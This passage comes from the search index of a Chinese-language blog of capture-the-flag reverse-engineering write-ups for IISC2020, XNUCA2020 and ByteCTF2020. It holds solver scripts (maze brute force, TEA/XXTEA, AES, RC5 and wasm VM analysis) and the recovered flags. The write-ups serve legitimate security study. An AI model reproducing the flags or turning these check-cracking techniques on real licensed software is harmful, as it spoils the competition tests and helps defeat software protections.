str(maze[11][8]) + str(maze[3][4]) flag2 = hashlib.sha256(s.encode('latin-1')).hexdigest() flag = flag2[::-1] + flag1[::-1] final_flag = hashlib.sha256(flag.encode('latin-1')).hexdigest() print('flag{' + final_flag[0:32] + '}') # okay decompiling snake.pyc ","date":"2020-11-07","objectID":"/iisc2020-%E7%BA%BF%E4%B8%8B%E8%B5%9Bre/:1:0","tags":null,"title":"IISC2020-线下赛re","uri":"/iisc2020-%E7%BA%BF%E4%B8%8B%E8%B5%9Bre/"},{"categories":["writeup"],"content":"逆向 从文件逻辑可以看出来这道题需要走迷宫和爆破这个迷宫(因为有要求迷宫的hash值) 爆破迷宫的话只需要爆破maze[1][1], maze[3][4], maze[7][7], maze[11][8]的值就可以了，因为这几个值确定了以后整个迷宫就确定了。 爆破迷宫 import hashlib, sys, random, time flag = 0 for a in range(987, 1001): for b in range(345, 357): for c in range(107, 117): for d in range(833, 857): maze = [ [1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], [1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0], [0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0], [0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0], [0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0], [0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0], [0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0], [0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0], [0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0], [0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0], [0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0], [0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 9]] maze[1][1] = a maze[3][4] = b maze[7][7] = c maze[11][8] = d for i in range(12): for j in range(12): tmp = 12 * i + j if maze[i][j] == 0: maze[i][j] = 3456 + tmp continue if tmp % 4 == 0: random.seed(maze[1][1]) for cnt in range(tmp): random.randint(0, 999) maze[i][j] = random.randint(0, 999) elif tmp % 4 == 1: random.seed(maze[3][4]) for cnt in range(tmp): random.randint(555, 1234) maze[i][j] = random.randint(555, 1234) elif tmp % 4 == 2: random.seed(maze[7][7]) for cnt in range(tmp): random.randint(777, 888) maze[i][j] = random.randint(777, 888) elif tmp % 4 == 3: random.seed(maze[11][8]) for cnt in range(tmp): random.randint(369, 777) maze[i][j] = random.randint(369, 777) maze[11][11] = 9 result = '' for xx in maze: for xxx in xx: result += str(xxx) hash_res = hashlib.sha256(result.encode('latin-1')).hexdigest() if hash_res == 'f1793dcf5ad3858512b944ac34413725a27c63e25618858231e88b9686466b00': flag = 1 print(a, b, c, d) if flag: break if flag: break if flag: break if flag: break print(a) \"\"\" 爆破出来的值： maze[1][1] = 996 maze[3][4] = 352 maze[7][7] = 113 maze[11][8] = 849 \"\"\" 走迷宫: #coding=utf-8 MIN = 9999999 a = [[0 for col in range(50)] for row in range(50)]#迷宫最大数组 book = [[0 for col in range(50)] for row in range(50)]#标记数组 lujing = ['*']*100 index_step = ['d', 's', 'a', 'w'] def dfs(start_x,start_y,end_x,end_y,migong_array,step): ''' :param start_x: 起始横坐标 :param start_y: 起始纵坐标 :param end_x: 终点横坐标 :param end_y: 终点纵坐标 :param migong_array: 迷宫的数组 :return: ''' next_step = [[0,1], #向右走 [1,0], #向下走 [0,-1], #向左走 [-1,0] #向上走 ] if (start_x == end_x and start_y == end_y): global MIN if(step \u003c MIN): MIN = step return 1 for i in range(len(next_step)): next_x = start_x + next_step[i][0] next_y = start_y + next_step[i][1] if(next_x \u003c 0 or next_y \u003c 0 or next_x \u003e len(migong_array) or next_y \u003e len(migong_array[0])): continue if(0\u003c= a[next_x][next_y] \u003c= 1234 and book[next_x][next_y] == 0): book[next_x][next_y] = 1 if dfs(next_x,next_y,end_x,end_y,migong_array,step+1): lujing[step] = index_step[i] return 1 book[next_x][next_y] = 0 return 0 if __name__ == '__main__': start_x = 0 start_y = 0 end_x = 11 end_y = 11 migong_array = [[545, 3457, 3458, 3459, 3460, 3461, 3462, 3463, 3464, 3465, 3466, 3467], [239, 796, 3470, 3471, 640, 948, 831, 3475, 3476, 3477, 3478, 3479], [3480, 1095, 843, 3483, 766, 3485, 848, 464, 95, 703, 3490, 3491], [3492, 3493, 864, 627, 8, 3497, 3498, 3499, 3500, 1064, 3502, 3503], [3504, 3505, 3506, 3507, 3508, 3509, 881, 600, 985, 706, 3514, 3515], [3516, 3517, 3518, 3519, 3520, 3521, 864, 3523, 3524, 3525, 3526, 3527], [3528, 1214, 779, 709, 804, 3533, 813, 403, 861, 1096, 829, 3539], [3540, 628, 3542, 3543, 494, 3545, 3546, 395, 3548, 3549, 798, 3551], [3552, 988, 3554, 3555, 485, 3557, 3558, 3559, 3560, 674, 777, 3563], [3564, 761, 802, 3567, 412, 568, 829, 721, 217, 1137, 3574, 3575], [3576, 3577, 853, 763, 3580, 3581, 3582, 3583, 3584, 3585, 3586, 3587], [3588, 3589, 3590, 372, 962, 923, 785, 502, 368, 707, 795, 9]] #初始化迷宫 for i in range(len(migong_array)): for j in range(len(migong_array[0])): a[i][j] = migong_array[i][j] #将迷宫数组写入a中 book[start_x][start_y] = 1 #将第一步标记为1，证明走过了。避免重复走 dfs(start_x,start_y,end_x,end_y,migong_array,0) print('The min length of path is : {}'.format(MIN)) print(\"\"","date":"2020-11-07","objectID":"/iisc2020-%E7%BA%BF%E4%B8%8B%E8%B5%9Bre/:2:0","tags":null,"title":"IISC2020-线下赛re","uri":"/iisc2020-%E7%BA%BF%E4%B8%8B%E8%B5%9Bre/"},{"categories":["writeup"],"content":"unravelmfc flag长度66（输入66长度字符才能点击确定）点确定没反应，只有flag正确才会弹框 首先使用下面的mfc的sig文件： http://s.wjk.moe/bt/tmp/unravelmfc/afx140d.sig 在CCmdTarget::OnCmdMsg函数内部， 调用_AfxDispatchCmdMsg的call指令下断点，再点确定，即可在栈参数中找到对应的处理函数指针 MFC逆向 0x00CB1080 点确定后的处理函数 (程序基址我rebase到了0x00b10000) 00CB127C 是flag正确 直接看最下面的if，里面调用的两个函数。前33字符和后33字符分开判断检测。 if ( (unsigned __int8)j_check1((int)v14, v13) \u0026\u0026 (unsigned __int8)j_check2((int)v14 + v13, v13) ) 前33字节首先RC4，再base64 flag{dsdafasdfasdsddddddddddddddddddddddddddddddddddddddddddddddd} 异或后： 00ACE9F4 26 44 D7 3B A8 E0 2F 7E 81 7E 9C 4C 39 A8 97 C8 \u0026D×;¨à/~.~.L9¨.È 00ACEA04 59 35 27 E6 1E CD 38 87 80 2C 99 C1 DD 5D 1F B0 Y5'æ.Í8..,.ÁÝ].° 00ACEA14 9A 00 base64是改了字符表的，在一个rc4加密的代码段里，x64dbg里将内存dump出来放到ida里用f5还勉强能看吧 enc_real = \"B=.NI;\u00263JBZ;$;?(I72'0\u00264GLZDS2V6\u0026%AF.!5#+J[F^\" import base64 def decoder(local_base64): import string real_base64_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + '+/' tmp_charset = \"#$%\u0026'()*+,-./0123456789:;\u003c=\u003e?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ab\" b64_str = '' for i in local_base64: t = real_base64_charset[tmp_charset.find(i)] b64_str += t return (base64.decodebytes(b64_str.encode())) def test1(): orig = b\"\u0026D\\xd7;\\xa8\\xe0/~\\x81~\\x9cL9\\xa8\\x97\\xc8Y5'\\xe6\\x1e\\xcd8\\x87\\x80,\\x99\\xc1\\xdd]\\x1f\\xb0\\x9a\" encoded = \",G6:1]FC.Z]$BLT/1=E:U(GX,a;AV6E*C%U\u003cS@X@*^%=\" assert decoder(encoded) == orig test1() def derc4(inp): moder_b =b'@(\\xb6\\\\\\xd3\\x84\\\\\\x1a\\xe0\\x18\\xfd?]\\xce\\xf6\\xbb=FC\\x82z\\xa9\\\\\\xe3\\xe4H\\xfd\\xa5\\xb99{\\xd4\\xfe' res = [] for i,j in zip(inp, moder_b): res.append(i^j) return bytes(res) def test2(): orig = b'flag{dsdafasdfasdsddddddddddddddd' out = b\"\\x26\\x44\\xD7\\x3B\\xA8\\xE0\\x2F\\x7E\\x81\\x7E\\x9C\\x4C\\x39\\xA8\\x97\\xC8\\x59\\x35\\x27\\xE6\\x1E\\xCD\\x38\\x87\\x80\\x2C\\x99\\xC1\\xDD\\x5D\\x1F\\xB0\\x9A\" assert derc4(out) == orig test2() 前半部分flag就出来了。。。 后33字符：第一个字符是f，后面三十二个字符单独加密 是tea算法，只改了delta。 需要解一个方程解出来是[0x2d46347f5e79f6f4, 0xDF3634AE2F9970FF, 0x6cacebd512c2fc6d, 0xe8e95dc6c558d3ec] import ctypes def encipher(v, k): y, z = [ctypes.c_uint32(x) for x in v] sum = ctypes.c_uint32(0) # delta = 0x9E3779B9 delta = 0x2433b95a for n in range(32, 0, -1): sum.value += delta # z -- v8 # y -- v6 # y.value += ((z.value \u003c\u003c 4) + k[0]) ^ (z.value + sum.value) ^ ((z.value \u003e\u003e 5) + k[1]) # z.value += ((y.value \u003c\u003c 4)) + k[2] ^ y.value + sum.value ^ (y.value \u003e\u003e 5) + k[3] y.value += (z.value \u003c\u003c 4) + k[0] ^ z.value + sum.value ^ (z.value \u003e\u003e 5) + k[1] z.value += (y.value \u003c\u003c 4) + k[2] ^ y.value + sum.value ^ (y.value \u003e\u003e 5) + k[3] # print(hex(sum.value)) return [y.value, z.value] def decipher(v, k): y, z = [ctypes.c_uint32(x) for x in v] # sum = ctypes.c_uint32(0xC6EF3720) sum = ctypes.c_uint32(0x86772b40) # delta = 0x9E3779B9 delta = 0x2433b95a for n in range(32, 0, -1): z.value -= (y.value \u003c\u003c 4) + k[2] ^ y.value + sum.value ^ (y.value \u003e\u003e 5) + k[3] y.value -= (z.value \u003c\u003c 4) + k[0] ^ z.value + sum.value ^ (z.value \u003e\u003e 5) + k[1] sum.value -= delta return [y.value, z.value] keys = [3647016194, 716023165, 2742368241, 3265149203, 3583257832, 1619840614, 1834562594, 568710898, 3980038709, 2645385924, 945185819, 1912036253, 3705592552, 3939684768, 3133470052, 3662115500] vv = [0x5e79f6f4, 0x2d46347f, 0x2F9970FF, 0xDF3634AE , 0x12c2fc6d, 0x6cacebd5, 0xc558d3ec, 0xe8e95dc6] data = [] for i in range(4): v = vv[2*i: 2*(i+1)] v = v[::-1] k = keys[4*i:4*(i+1)] enc = decipher(v, k) data.append(enc[0]) data.append(enc[1]) flag = \"\" for d in data: flag = flag + (hex(d).replace(\"0x\", \"\")[:-1]).decode('hex')[::-1] print('f'+flag) ","date":"2020-11-02","objectID":"/xnuca2020-re/:1:0","tags":null,"title":"XNUCA2020-re","uri":"/xnuca2020-re/"},{"categories":["writeup"],"content":"hellowasm 需要用node起一下直接点开不行 npm install http-server -g http-server -p 8080 长度是42 这里可以直接用浏览器调试，还比较方便。 然后做了个base64, 每四个字符一组，异或[0xa, 0xb, 0xc, 0xd] 最后check的部分是个vm，算法是简单异或。 一点点分析的过程，分析了一点以后直接在异或和比较的函数下了断点发现算法其实比较简单。 +4; -\u003e IP +32 -\u003e source +16 -\u003e str_index +8 -\u003e source[str_index] +24 -\u003e 初始IP: 2128 202 -\u003e IP + 5 203 -\u003e IP + 5 204 -\u003e IP + 1, load source 207 -\u003e ^ +12 save in 12, IP + 1 201 -\u003e next IP, save in 8, IP + 5 opcode 2128: 202 2129: 0 2130: 0 2131: 0 2132: 0 2133: 203 2134: 0 2135: 0 2136: 0 2137: 0 2138: 204 2139: 207 2140: 201 2141: 238 2142: 0 2143: 0 2144: 0 2145: 207 -\u003e // source[0] ^ 238 2146: 209 -\u003e 2160[index] == source[0] ^ 238 import base64 result = {2160: 190, 2161: 54, 2162: 172, 2163: 39, 2164: 153, 2165: 79, 2166: 222, 2167: 68, 2168: 238, 2169: 95, 2170: 218, 2171: 11, 2172: 181, 2173: 23, 2174: 184, 2175: 104, 2176: 194, 2177: 78, 2178: 156, 2179: 74, 2180: 225, 2181: 67, 2182: 240, 2183: 34, 2184: 138, 2185: 59, 2186: 136, 2187: 91, 2188: 229, 2189: 84, 2190: 255, 2191: 104, 2192: 213, 2193: 103, 2194: 212, 2195: 6, 2196: 173, 2197: 11, 2198: 216, 2199: 80, 2200: 249, 2201: 88, 2202: 224, 2203: 111, 2204: 197, 2205: 74, 2206: 253, 2207: 47, 2208: 132, 2209: 54, 2210: 133, 2211: 82, 2212: 251, 2213: 115, 2214: 215, 2215: 13, 2216: 227} flag = [] li = [0] for k in result.keys(): li.append(result[k]) for i in range(1, len(li)): flag.append(li[i-1] ^ li[i] ^ 238) ti = [0xa, 0xb, 0xc, 0xd] tar = \"\" for i in range(0, len(flag)-4, 4): for j in range(4): tar = tar + chr(ti[j] ^ flag[i+j]) print(base64.decodestring(tar)) ","date":"2020-11-02","objectID":"/xnuca2020-re/:2:0","tags":null,"title":"XNUCA2020-re","uri":"/xnuca2020-re/"},{"categories":["writeup"],"content":"babyarm 主要验证部分在sub_114D8, xxtea稍微改了一点，一次加密了16轮…长度也是16 #include \u003cstdio.h\u003e #include \u003cstdint.h\u003e #define DELTA 0x9e3779b9 #define MX (((z\u003e\u003e5^y\u003c\u003c2) + (y\u003e\u003e3^z\u003c\u003c4)) ^ ((sum^y) + (key[(p\u00263)^e] ^ z))) void btea(uint32_t *v, int n, uint32_t const key[4]) { uint32_t y, z, sum; unsigned p, rounds, e; if (n \u003e 1) /* Coding Part */ { rounds = 6 + 52/n; sum = 0; z = v[n-1]; do { sum += DELTA; e = (sum \u003e\u003e 2) \u0026 3; for (p=0; p\u003cn-1; p++) { y = v[p+1]; z = v[p] += MX; } y = v[0]; z = v[n-1] += MX; } while (--rounds); } else if (n \u003c -1) /* Decoding Part */ { for(int i = 0; i \u003c 16; i++) { n = 16; rounds = 6 + 52/n; sum = rounds*DELTA; y = v[0]; do { e = (sum \u003e\u003e 2) \u0026 3; for (p=n-1; p\u003e0; p--) { z = v[p-1]; y = v[p] -= MX; } z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); } } } int main() { uint32_t v[16]= {0xB061F013, 0xB3C8567E, 0x9952A3C7, 0x451C2D3F, 0x3EE32267, 0xE3E22B3E, 0x43E5A250, 0x59B28ED0, 0x0F8649DC, 0x9BF4D083, 0x8A578110, 0x8604EC4F, 0x2EB5A27F, 0x1217DDF3, 0x93C9B253, 0xDC7F8E43}; uint32_t const k[4]= {2,2,3,4}; int n= 16; // for(int i = 0; i \u003c 16; i++) btea(v, -n, k); for(int i = 0; i \u003c 16; i++) printf(\"\\\"%x\\\", \", v[i]); return 0; } \u003e\u003e\u003e s = [\"67616c66\", \"6330447b\", \"37306261\", \"35346146\", \"36623241\", \"62376646\", \"41364541\", \"41624261\", \"64354635\", \"43336263\", \"43446639\", \"66613545\", \"34354665\", \"38434144\", \"30354138\", \"7d413339\"] \u003e\u003e\u003e flag = \"\" \u003e\u003e\u003e for i in s: ... flag = flag + i.decode('hex')[::-1] ... \u003e\u003e\u003e flag 'flag{D0cab07Fa45A2b6Ff7bAE6AaBbA5F5dcb3C9fDCE5afeF54DAC88A5093A}' ","date":"2020-11-02","objectID":"/xnuca2020-re/:3:0","tags":null,"title":"XNUCA2020-re","uri":"/xnuca2020-re/"},{"categories":["writeup"],"content":"这次比赛让我知道了AES密钥长度除了可以等于16还可以等于32…不要看到AES256的时候脑子里只有AES没有256== ","date":"2020-10-27","objectID":"/bytectf2020-re/:0:0","tags":null,"title":"ByteCTF2020-re","uri":"/bytectf2020-re/"},{"categories":["writeup"],"content":"DaShen Decode AES 白给题，sqlite直接查询出来iv和key然后AES解密即可 #!/usr/bin/env python from Crypto.Util.number import * from Crypto.Cipher import AES import sqlite3 fileName = \"db.db\" conn = sqlite3.connect(fileName) c =conn.cursor() ret = c.execute(\"SELECT * FROM config1 WHERE a=1\") for i in ret: print(i) enc = \"db6427960a6622ffac27ef5437acf1459a592d1a96b73e75490c8badb0ed294c1e9232213e63461dd2d9f6d327e51641\" iv = b\"a5efdbd57b84ca88\" key = b\"37eaae0141f1a3adf8a1dee655853766\" key = long_to_bytes(int(key,16)) cipher = AES.new(key,AES.MODE_CBC,iv) enc = long_to_bytes(int(enc,16)) dec = cipher.decrypt(enc) print(dec) # ByteCTF{fl-ag-IS-to-ng-xu-el-ih-ai} ","date":"2020-10-27","objectID":"/bytectf2020-re/:1:0","tags":null,"title":"ByteCTF2020-re","uri":"/bytectf2020-re/"},{"categories":["writeup"],"content":"QIAO main函数的ollvm去掉以后可以看到大致逻辑 _int64 __fastcall main(int a1, char **a2, char **a3, __m128i a4) { void *v5; // [rsp+60h] [rbp-30h] unsigned int v6; // [rsp+78h] [rbp-18h] if ( a1 == 2 \u0026\u0026 strlen(a2[1]) == 32 \u0026\u0026 (v5 = sub_401180(a2[1]), (unsigned int)sub_4018C0((__int64)v5, a4)) ) { printf(\"[*]%s.\\n\", a2[1]); v6 = 0; } else { v6 = -1; printf(\"[*]ByteCTF{d2h5IG5vdCBnbyBob21l}.\\n\"); } return v6; } sub_401180将输入转16进制数，sub_4018C0调用了sub_401E90是个很大的vm，调试了一会儿发现没啥用，最后面动态调用了一个函数((void (__fastcall *)(_QWORD, _QWORD))v149)(*inputStr, *v136);,在这个地方下断点然后对输入下读写断点以后，断了几次发现了下面这个： 尝试输入了一下发现真的就是flag… ","date":"2020-10-27","objectID":"/bytectf2020-re/:2:0","tags":null,"title":"ByteCTF2020-re","uri":"/bytectf2020-re/"},{"categories":["writeup"],"content":"CrackMe sha256算法经过了更改，在输入长度超过32个字节的时候只有前四个字节参与了运算，直接爆破前四个字节 sha256我在github上找了一个很相似的项目改了一下：https://github.com/monkeyDemon/Blockchain-programming-exercises/blob/master/1.Blockchain%20basic%20exercises/2.Cryptography%20and%20security%20technology/SHA256/C%20Code/sha256.c #include \u003cstdio.h\u003e #include \u003cstdint.h\u003e #include \u003cstring.h\u003e #include \u003cstdlib.h\u003e #include \u003cmemory.h\u003e #include \u003cstring.h\u003e #include \"sha256.h\" #define BLOCKSIZE 16 typedef struct{ uint32_t eK[44],dK[44]; int rounds; } AESKEY; #define ROF32(x,n) ((x \u003c\u003c n) | (x \u003e\u003e (32-n))) #define ROR32(x,n) ((x \u003e\u003e n) | (x \u003c\u003c (32-n))) #define BYTE(x,n) (((x)\u003e\u003e((n)*8)) \u0026 0xff) #define MIX(x) (((S[BYTE((x),2)] \u003c\u003c 24) \u0026 0xff000000) ^ \\ ((S[BYTE((x),1)] \u003c\u003c 16) \u0026 0xff0000) ^ \\ ((S[BYTE((x),0)] \u003c\u003c 8) \u0026 0xff00) ^ \\ ((S[BYTE((x),3)]) \u0026 0xff)) #define LOAD32(x,y) do{ (x) = \\ ((uint32_t)((y)[0]\u00260xff)\u003c\u003c24) |\\ ((uint32_t)((y)[1]\u00260xff)\u003c\u003c16) |\\ ((uint32_t)((y)[2]\u00260xff)\u003c\u003c8 ) |\\ ((uint32_t)((y)[3]\u00260xff));\\ }while(0) #define STORE32(x,y) do{ \\ (y)[0] = (uint8_t)(((x)\u003e\u003e24) \u0026 0xff) ; \\ (y)[1] = (uint8_t)(((x)\u003e\u003e16) \u0026 0xff) ; \\ (y)[2] = (uint8_t)(((x)\u003e\u003e8) \u0026 0xff) ; \\ (y)[3] = (uint8_t)((x) \u0026 0xff) ; \\ }while(0) unsigned char S[256] = { 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16}; unsigned char inv_S[256] = { 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51,","date":"2020-10-27","objectID":"/bytectf2020-re/:3:0","tags":null,"title":"ByteCTF2020-re","uri":"/bytectf2020-re/"},{"categories":["writeup"],"content":"App1c 解压出来的二进制文件中有一个check函数，显示需要读取sandbox/secret文件，读取出来的字符串做md5后Aes256ECB解密MnRC6I9E0BbJ7LxLfrKhP6Xv5+c41AORjmG66eQxQks=即可获取flag。在run函数中可以看到调用了lua脚本，解压出来存在一个叫AppIcon.lua的脚本，可以直接编辑模式打开看到上面一段可读的脚本内容： input = tostring(arg[1]) sanboxPath = tostring(arg[2])..\"/secret\" debase64 = from_base64(input) secret = \"0\" if debase64 ~= nil then secret = string.app1c(debase64) end file = io.open(sanboxPath, \"w\") io.output(file) io.write(tostring(secret)) io.close(file) 本来我没注意到string.app1c这个函数的时候我觉得下面不可读的内容也是有用的，但是没办法反编译，我用这个反汇编了一下发现其实就是base64的包，我码一下用到的几个lua相关的链接 基本知识与010Editor解析脚本：https://github.com/feicong/lua_re luadec: https://github.com/viruscamp/luadec 还有个工具是unlua 调用时arg[1]是用户输入的字符串，arg[2]是sandbox的路径。将输入解base64后经过string.app1c的处理写入sandbox/secret文件。这个string.app1c猜测是对lua的string包做了扩展，然后找到了下面这个例子： #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \"lua.h\" #include \"lualib.h\" #include \"lauxlib.h\" #import \u003cobjc/runtime.h\u003e #import \u003cFoundation/Foundation.h\u003e #import \u003cUIKit/UIDevice.h\u003e /* 库 open 函数的前置声明 */ int luaopen_mt(lua_State *L); /* Function mt_get_device_name * @return string device name */ static int mt_get_device_name(lua_State *L) { NSString *name = [[UIDevice currentDevice] name]; const char * name_str = [name UTF8String]; lua_pushstring(L, name_str); return 1; } //注册函数库 static const luaL_Reg mt_lib[] = { {\"device_name\", mt_get_device_name}, //获取设备名称 {NULL, NULL} }; int luaopen_mt(lua_State *L)//注意, mt为扩展库的文件名 { luaL_newlib(L, mt_lib);//暴露给lua脚本的接口 return 1; } // PWNlua层里的调用方法为: local mt = require \"mt\" print(mt.device_name()) 所以需要找一下app1c这个字符串指向的函数： __const:000246FC DCD aReverse ; \"reverse\" __const:00024700 DCD sub_19146+1 __const:00024704 DCD aSub_1 ; \"sub\" __const:00024708 DCD sub_191BA+1 __const:0002470C DCD aUpper ; \"upper\" __const:00024710 DCD sub_1923E+1 __const:00024714 DCD aApp1c_0 ; \"app1c\" __const:00024718 DCD sub_192B4+1 sub_192B4这个函数要求输入字符串长度是4，且可转10进制数。所以直接爆破4位的十进制数。注意是AES256…不是128 if __name__ == \"__main__\": from Crypto.Cipher import AES s = \"MnRC6I9E0BbJ7LxLfrKhP6Xv5+c41AORjmG66eQxQks=\" import base64, hashlib enc = base64.decodestring(s) for a in range(ord('0'), ord('9')+1, 1): for b in range(ord('0'), ord('9')+1, 1): for c in range(ord('0'), ord('9')+1, 1): for d in range(ord('0'), ord('9')+1, 1): ss = chr(a)+chr(b)+chr(c)+chr(d) key = hashlib.md5(ss).hexdigest() # 就是这里，我还decode了一下所以一直不对，气死我了 ci = AES.new(key,AES.MODE_ECB) strs = ci.decrypt(enc) if strs.find(\"ByteCTF\") \u003e= 0: print strs print chr(a)+chr(b)+chr(c)+chr(d) exit(0) ","date":"2020-10-27","objectID":"/bytectf2020-re/:4:0","tags":null,"title":"ByteCTF2020-re","uri":"/bytectf2020-re/"},{"categories":["writeup"],"content":"easyre 有两层加密，第一层是AES，第二层是RC5 前面是padding，填充方式是PKCS#7 AES 在sub_FBE这个函数中有明显的AES加密特征: 有十轮加密，四个步骤，第十轮少了中间的步骤。对应的是AES的:字节代换、行移位、列混淆和轮密钥加，第十轮没有列混淆。 sub_DA2是密钥扩展步骤。代码中AES的Sbox被修改了，在文件中给出了Sbox和InvSbox。 密钥扩展部分也进行了一点修改，所以生成的子密钥会有不同。 AES代码: for (i = 1; i \u003c= 10; i++) { for (j = 0; j \u003c 4; j++) { unsigned char t[4]; for (r = 0; r \u003c 4; r++) { t[r] = j ? w[i][r][j - 1] : w[i - 1][r][3]; } if (j == 0) { unsigned char temp = t[0]; for (r = 0; r \u003c 3; r++) { t[r] = Sbox[t[(r + 1) % 4]]; } t[3] = Sbox[temp]; t[0] ^= rc[i - 1]; } for (r = 0; r \u003c 4; r++) { w[i][r][j] = w[i - 1][r][j] ^ t[r]; } } } 修改后的： if ( !l ) { for ( n = 0; n \u003c= 3; ++n ) v12[n] = *(_BYTE *)(a1 + (unsigned __int8)v12[(n + 1) % 4] + 8); v12[0] ^= *(\u0026v13 + k - 1); } 等于3的这个部分有一点更改，但是可以不用管这个更改的细节，直接dump出文件中扩展出来的密钥解密即可。 RC5 根据0xB7E15163, 0x9E3779B9这两个长度可以判断猜测是RC5，密钥长度是16，轮数是12，块大小是32.同样可以找个RC5的代码进行加密验证一下 solve class AES: MIX_C = [[0x2, 0x3, 0x1, 0x1], [0x1, 0x2, 0x3, 0x1], [0x1, 0x1, 0x2, 0x3], [0x3, 0x1, 0x1, 0x2]] I_MIXC = [[0xe, 0xb, 0xd, 0x9], [0x9, 0xe, 0xb, 0xd], 